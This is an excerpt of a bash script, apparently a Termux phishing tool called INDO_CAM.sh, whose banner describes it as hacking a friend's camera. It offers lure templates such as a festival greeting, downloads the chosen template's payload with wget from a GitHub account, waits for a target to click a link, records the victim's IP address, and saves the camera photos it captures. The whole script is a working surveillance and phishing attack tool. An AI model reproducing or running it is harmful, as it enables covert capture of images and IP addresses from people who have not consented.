...
${cyan} ║╚═╝║╔╗║║║╠╝╚╝║║─║║║══╣
${cyan} ╚═══╩╝╚╩╩╩╩═══╩╝─╚╩═══╝
${yellow}          [Script By Dhanz Or Lord Udin]
"
...
trap "echo -e '\n${success}Thanks for Using! Visit Site : https://youtube.com/watch?v=vemTtnxqqw0&feature=share8'; exit" 2

# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang INDO_CAM.sh
termux=true
else
termux=false
fi
...
sleep 1
printf "${cyan}\nLORD-UDIN-DHANZ${nc}@${blue}LORD-INDONESIA ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nLORD-UDIN-DHANZ${nc}@${blue}LORD-UDIN ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
...
$red[Description]${cyan} :[Hack Kamera Temen Lu]
$red[Author]     ${cyan} :[LORD-UDIN]
$red[Github]     ${cyan} :[https://github.com/Dhanz03]"
printf "${cyan}\nLORD-UDIN-DHANZ${nc}@${cyan}LORD-UDIN ${red}$ ${nc}"
read about
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/LORD-UDIN/files/raw/main/${dir}.zip"
...
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Menunggu Target Klik link!\n"
    ...
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}FOTO BERHASIL DI SIMPAN DI ANDROID...\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
